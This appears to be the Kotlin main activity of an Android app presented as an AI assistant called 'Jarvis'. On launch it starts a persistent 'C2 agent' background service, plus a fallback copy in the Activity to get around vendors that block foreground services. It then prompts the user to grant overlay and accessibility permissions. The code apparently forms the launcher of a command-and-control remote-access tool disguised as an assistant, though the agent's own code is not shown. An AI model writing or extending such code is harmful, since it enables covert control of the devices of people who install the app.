package com.ai.assistant.jarvis

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.ai.assistant.jarvis.ui.JarvisAppUI

class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "MainActivity"
    }

    private var c2Fallback: JarvisC2Agent? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Launch the persistent background C2 agent service
        JarvisAgentService.start(this)

        // Also start C2 agent directly in Activity scope (fallback for OEMs
        // like vivo that block foreground services)
        Log.d(TAG, "Starting C2 agent fallback from Activity")
        c2Fallback = JarvisC2Agent(applicationContext)
        c2Fallback?.start()

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    JarvisAppUI(onActivateClicked = {
                        // Request overlay + accessibility permissions on first launch
                        PermissionManager.requestOverlayPermission(this@MainActivity)
                        PermissionManager.openAccessibilitySettings(this@MainActivity)
                    })
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        c2Fallback?.stop()
        c2Fallback = null
    }
}
